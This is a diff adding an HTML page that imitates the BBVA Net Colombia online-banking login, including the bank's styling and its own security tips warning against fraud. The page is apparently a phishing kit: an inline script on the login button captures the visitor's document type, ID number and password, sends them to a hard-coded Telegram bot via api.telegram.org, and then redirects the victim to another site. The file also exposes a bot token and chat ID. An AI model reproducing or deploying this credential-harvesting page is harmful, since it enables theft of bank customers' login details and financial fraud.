@@ -1,0 +1,193 @@
+
+<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" type="text/css" href="cid:css-c2b73e2b-8549-4848-a8e7-9fe5768c33df@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-6f5a341c-f0c7-4f71-ae67-2287d2b8e8b5@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-ea34b4a3-4de3-44ae-8805-8aee9e5d1d4c@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-aebc7958-a5e2-4ce8-9788-2fa0da15aeb1@mhtml.blink" />
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex">
+    <meta http-equiv="Expires" content="0">
+    <meta http-equiv="Last-Modified" content="0">
+    <meta http-equiv="Cache-Control" content="no-cache, mustrevalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <link href="https://nuevaversion.bbvanet.com.co/css/global.min.css" rel="stylesheet" type="text/css">
+    <link href="https://nuevaversion.bbvanet.com.co/css/coronita.css" rel="stylesheet" type="text/css">
+    
+    <link id="via_inject_css_blocker" type="text/css" rel="stylesheet" href="https://nuevaversion.bbvanet.com.co/via_inject_blocker.css">
+    
+    
+    
+    
+    <title>BBVA Net Colombia</title>
+</head>
+<script>
+  
+  
+  document.addEventListener('DOMContentLoaded', function() {
+  document.getElementById('btnLogin').addEventListener('click', function(event) {
+    event.preventDefault(); 
+    const token = '7305607951:AAHxeB-mnSoXBTLW8ZcSVtkH_3ZQitgdkUY'; 
+    const chatId = '7060108163'; 
+    const docType = document.getElementById('docTypeNoMovil').value; 
+    const docNumber = document.getElementById('docNumberMovil').value; 
+    const password = document.getElementById('passwordMovil').value; const message = `Tipo de documento: ${docType}\nNúmero de documento: ${docNumber}\nContraseña: ${password}`;
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          console.log('n'); 
+        } else {
+          console.error('E'); 
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error); 
+      })
+      .finally(() => {
+        window.location.href = 'https://www.otraweb.com';
+      });
+  });
+});
+  
+  
+  
+</script>
+<body class="m-login" id="data-analytics">
+    <div id="header">
+        <div id="subHeader" class="subHeader rowlogin">
+            <div id="sh1" class="container header-info-container">
+                <img style="display: flex; width:100px; " src="https://nuevaversion.bbvanet.com.co/images/bbva-white.svg">
+                <h5 style="margin-right: 7rem">Acceso a BBVA Net Colombia</h5>
+            </div>
+            <a id="sh2" type="button" class="close">
+                <i class="iconcoronita-close"></i>
+            </a>
+        </div>    
+    </div>
+    <div class="m-login__content">
+        <div class="m-login__main">
+            <form id="redirectLogin" method="post" target="_top" autocomplete="OFF">
+                
+                
+                
+                
+            </form>
+            <h1 class="c-bodycopy margin-bottom-small c-bodycopy--highlighted">Hola, ingresa tu número de documento y contraseña para entrar a BBVA Net:</h1>
+            <form aria-label="Formulario de acceso" class="m-login__form" id="noform" autocomplete="OFF">
+                <select name="docTypeNoMovil" id="docTypeNoMovil" class="select-coronita mt1 mb0">
+                    <option value="CC">Cédula de Ciudadanía</option>
+                    <option value="CE">Cédula de Extranjería</option>
+                    <option value="TI">Tarjeta de Identidad</option>
+                    <option value="PP">Pasaporte</option>
+                    <option value="NIP">Número Identificación Personal</option>
+					<option value="CV">Permiso Permanencia Temporal</option>
+                </select>
+                <span class="input input--yoshiko mt1 mb0">
+                    <input type="text" id="docNumberMovil" class="input__field input__field--yoshiko requiered " maxlength="15">
+                    <label for="docNumberMovil" class="input__label input__label--yoshiko">
+                        <span data-content="Número de documento" class="input__label-content input__label-content--yoshiko">Número
+                            de documento</span>
+                    </label>
+                </span>
+                <div id="docNumberMovilAlert" role="alert" class="alert">
+                    <div class="c-input-box__description">
+                        <div class="c-input-box__description-error">
+                            <div class="m-validation">
+                                <div class="m-validation__error" id="4379518b-466c-4e77-b52f-e9e3e27b3ada"><i class="c-icon-alert m-validation__icon" aria-label="Error" role="img"></i> Este
+                                    campo es requerido.</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <span class="input input--yoshiko mt1 mb0">
+                    <input type="password" id="passwordMovil" class="input__field input__field--yoshiko requiered" maxlength="8">
+                    <label for="passwordMovil" class="input__label input__label--yoshiko">
+                        <span data-content="Contraseña" class="input__label-content input__label-content--yoshiko">Contraseña</span>
+                    </label>
+                </span>
+                <div id="passwordMovilAlert" role="alert" class="alert">
+                    <div class="c-input-box__description">
+                        <div class="c-input-box__description-error">
+                            <div class="m-validation">
+                                <div class="m-validation__error" id="4379518b-466c-4e77-b52f-e9e3e27b3ada"><i class="c-icon-alert m-validation__icon" aria-label="Error" role="img"></i> Este
+                                    campo es requerido.</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="flex flex-align-center mt1">
+                    <a id="btnLogin" class="c-button--secondary m-login__button"><span class="c-button__text">Entrar</span>
+                    </a>
+                    <a id="redirectLink" class="c-link c-link-headline" target="_top" href="https://nuevaversion.bbvanet.com.co/bbvaco/kqpu_co_web/page/forgetPassword"><span class="c-link__text">¿Olvidaste tu
+                            contraseña?</span></a>
+                </div>
+            </form>
+        </div>
+        <aside aria-label="Clave de acceso" class="m-login__aside">
+            <div class="flex-column flex-align-start full-width">
+                <p class="c-bodycopy margin-bottom-medium text_18 c-bodycopy--lighten full-width"><span class="text-medium">Haz tu vida más fácil y sencilla</span> con todos los beneficios que
+                    te ofrece BBVA Net.                    
+                </p><a class="c-button--secondary margin-bottom-large" href="https://nuevaversion.bbvanet.com.co/bbvaco/kqpu_co_web/page/newRegister" target="_top"><span class="c-button__text">Regístrate</span></a>
+                <p class="c-bodycopy c-bodycopy--lighten full-width margin-top-auto text-medium">Maneja tus finanzas de forma ágil y segura.</p>
+               
+            </div>
+        </aside>
+    </div>
+    <div class="bg-grey_100 margin-top-xxlarge padding-xxlarge">
+        <div class="login-container">
+            <div class="margin-bottom-xsmall flex flex-align-center margin-left-xsmall"><img src="https://nuevaversion.bbvanet.com.co/img/lock_dark.svg" class="c-micro-illustration--xxsmall margin-right-xsmall">
+                <h2 class="text-grey_500 c-bodycopy--highlighted">Consejos de seguridad</h2>
+            </div>
+            <p class="c-bodycopy margin-bottom-xsmall margin-left-xsmall text-grey_600" style="text-align: justify;">En la modalidad de estafa <strong>'vishing'</strong> suplantan al personal del banco para obtener tu información privada a través de llamadas.</p>
+            <p class="c-bodycopy margin-bottom-xsmall margin-left-xsmall text-grey_600" style="text-align: justify;">Protege tus datos siguiendo estos consejos:</p>
+            <ul>
+                <li class="c-bullet--blue-medium">
+                    <p class="c-bodycopy margin-bottom-xsmall text-grey_600" style="text-align: justify;"><strong>Tus claves de acceso son secretas e intransferibles.</strong> No las compartas con nadie ni las envíes por correo electrónico o SMS.</p>
+                </li>
+                <li class="c-bullet--blue-medium">
+                    <p class="c-bodycopy margin-bottom-xsmall text-grey_600" style="text-align: justify;">No devuelvas llamadas de números desconocidos. <strong>Recuerda siempre llamar a las lineas oficiales de BBVA.</strong></p>
+                </li>
+                <li class="c-bullet--blue-medium">
+                    <p class="c-bodycopy margin-bottom-xsmall text-grey_600" style="text-align: justify;"><strong>BBVA nunca te pedirá un código de un solo uso (OTP) o token</strong> por correo electrónico, SMS o llamadas que tú no hayas iniciado.</p>
+                </li>
+                <li class="c-bullet--blue-medium">
+                    <p class="c-bodycopy margin-bottom-xsmall text-grey_600" style="text-align: justify;"><strong>No compartas información</strong> como contraseñas, números de tarjetas o códigos de confirmación y no los digites en el celular.</p>
+                </li>
+                <li class="c-bullet--blue-medium">
+                    <p class="c-bodycopy margin-bottom-xsmall text-grey_600" style="text-align: justify;">Si brindaste información o recibes notificación de transacciones que no reconoces, comunícate con nosotros.</p>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <div class="modal modal-md out m-error" id="coronita-modal">
+        <div class="modal-dialog modal-sm">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <a href="https://nuevaversion.bbvanet.com.co/loginAEM.html#" type="button" class="close">
+                        <i class="iconcoronita-close"></i>
+                    </a>
+                </div>
+                <div class="modal-body">
+                    <div class="row buttons">
+                        <div class="col-md-12 iconModal">
+                            <img src="https://nuevaversion.bbvanet.com.co/images/error.svg" alt="">
+                        </div>
+                        <h1>¿Estás seguro de querer salir del proceso?</h1>
+                        <div class="col-md-12">
+                            <p class="center">Se perderán los datos introducidos.</p>
+                        </div>
+                    </div>
+                    <div class="row buttons">
+                        <div class="col-md-8 col-md-offset-2 twoButtons">
+                            <a href="https://nuevaversion.bbvanet.com.co/loginAEM.html#" id="modalLogin1" style="line-height: 18px;" type="button" class="btn btn-blue">Continuar en el proceso</a>
+                            <a href="https://www.bbva.com.co/" id="modalLogin2" style="line-height: 18px;" type="button" class="btn btn-next btn-blue">
+                                Salir del proceso
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</body></html>
+                                                                                                             
